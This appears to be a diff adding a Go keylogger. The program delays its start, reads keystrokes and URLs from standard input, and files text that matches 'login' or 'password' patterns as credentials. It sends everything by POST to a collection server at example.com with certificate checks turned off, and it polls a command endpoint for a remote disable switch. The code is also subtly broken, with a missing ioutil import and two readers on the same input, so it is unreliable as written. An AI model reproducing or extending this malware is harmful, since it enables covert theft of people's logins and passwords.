@@ -1,0 +1,221 @@
+package main
+
+import (
+    "bufio"
+    "crypto/tls"
+    "fmt"
+    "log"
+    "net/http"
+    "os"
+    "regexp"
+    "strings"
+    "sync"
+    "time"
+    "unicode/utf8"
+)
+
+// KeyLogger struct to store logged keys, URLs, logins, and passwords
+type KeyLogger struct {
+    keys      []string
+    urls      []string
+    logins    []string
+    passwords []string
+    disabled  bool
+    mu        sync.Mutex
+}
+
+func main() {
+    logger := &KeyLogger{}
+
+    // Delay execution for 2 minutes
+    time.Sleep(2 * time.Minute)
+
+    go logger.captureKeys()
+    go logger.captureURLs()
+    go logger.checkDisableCommand()
+
+    // Keep the program running
+    select {}
+}
+
+// Capture keystrokes
+func (k *KeyLogger) captureKeys() {
+    reader := bufio.NewReader(os.Stdin)
+    loginRegex := regexp.MustCompile(`(?i)login|username|user`)
+    passwordRegex := regexp.MustCompile(`(?i)password|pass`)
+
+    for {
+        k.mu.Lock()
+        if k.disabled {
+            k.mu.Unlock()
+            return
+        }
+        k.mu.Unlock()
+
+        char, _, err := reader.ReadRune()
+        if err != nil {
+            log.Println("Error reading rune:", err)
+            continue
+        }
+
+        if utf8.ValidRune(char) {
+            k.mu.Lock()
+            k.keys = append(k.keys, string(char))
+            k.mu.Unlock()
+            fmt.Printf("Captured: %c\n", char)
+        }
+
+        // Simulate processing collected keys
+        k.mu.Lock()
+        capturedText := strings.Join(k.keys, "")
+        if loginRegex.MatchString(capturedText) {
+            k.logins = append(k.logins, capturedText)
+            k.keys = []string{}
+        } else if passwordRegex.MatchString(capturedText) {
+            k.passwords = append(k.passwords, capturedText)
+            k.keys = []string{}
+        }
+        if len(k.keys) > 100 {
+            k.mu.Unlock()
+            k.processAndSendData()
+        } else {
+            k.mu.Unlock()
+        }
+    }
+}
+
+// Capture URLs from the console input
+func (k *KeyLogger) captureURLs() {
+    reader := bufio.NewReader(os.Stdin)
+    for {
+        k.mu.Lock()
+        if k.disabled {
+            k.mu.Unlock()
+            return
+        }
+        k.mu.Unlock()
+
+        line, err := reader.ReadString('\n')
+        if err != nil {
+            log.Println("Error reading line:", err)
+            continue
+        }
+
+        if strings.Contains(line, "http://") || strings.Contains(line, "https://") {
+            k.mu.Lock()
+            k.urls = append(k.urls, strings.TrimSpace(line))
+            k.mu.Unlock()
+            fmt.Printf("Captured URL: %s\n", line)
+        }
+
+        // Simulate processing collected URLs
+        k.mu.Lock()
+        if len(k.urls) > 10 {
+            k.mu.Unlock()
+            k.processAndSendData()
+        } else {
+            k.mu.Unlock()
+        }
+    }
+}
+
+// Check for disable command from the server
+func (k *KeyLogger) checkDisableCommand() {
+    serverAddr := "https://example.com/command"
+
+    for {
+        k.mu.Lock()
+        if k.disabled {
+            k.mu.Unlock()
+            return
+        }
+        k.mu.Unlock()
+
+        tr := &http.Transport{
+            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        }
+        client := &http.Client{Transport: tr}
+
+        resp, err := client.Get(serverAddr)
+        if err != nil {
+            log.Println("Error checking disable command:", err)
+            time.Sleep(1 * time.Minute)
+            continue
+        }
+
+        body, err := ioutil.ReadAll(resp.Body)
+        if err != nil {
+            log.Println("Error reading response body:", err)
+            resp.Body.Close()
+            time.Sleep(1 * time.Minute)
+            continue
+        }
+        resp.Body.Close()
+
+        if strings.TrimSpace(string(body)) == "disable" {
+            k.mu.Lock()
+            k.disabled = true
+            k.mu.Unlock()
+            log.Println("Keylogger disabled by server command")
+            return
+        }
+
+        time.Sleep(1 * time.Minute)
+    }
+}
+
+// Process and send data securely to the server
+func (k *KeyLogger) processAndSendData() {
+    k.mu.Lock()
+    data := map[string][]string{
+        "keys":      k.keys,
+        "urls":      k.urls,
+        "logins":    k.logins,
+        "passwords": k.passwords,
+    }
+    k.keys = []string{}
+    k.urls = []string{}
+    k.logins = []string{}
+    k.passwords = []string{}
+    k.mu.Unlock()
+
+    go k.sendData(data)
+}
+
+// Send data over an encrypted connection
+func (k *KeyLogger) sendData(data map[string][]string) {
+    // Connect to the server
+    serverAddr := "https://example.com/collect"
+    tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+    }
+    client := &http.Client{Transport: tr}
+
+    reqBody := fmt.Sprintf("keys=%s&urls=%s&logins=%s&passwords=%s",
+        strings.Join(data["keys"], ""),
+        strings.Join(data["urls"], "\n"),
+        strings.Join(data["logins"], "\n"),
+        strings.Join(data["passwords"], "\n"),
+    )
+
+    req, err := http.NewRequest("POST", serverAddr, strings.NewReader(reqBody))
+    if err != nil {
+        log.Println("Error creating request:", err)
+        return
+    }
+
+    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+    resp, err := client.Do(req)
+    if err != nil {
+        log.Println("Error sending data:", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode == http.StatusOK {
+        log.Println("Data sent successfully")
+    } else {
+        log.Println("Failed to send data:", resp.Status)
+    }
+}
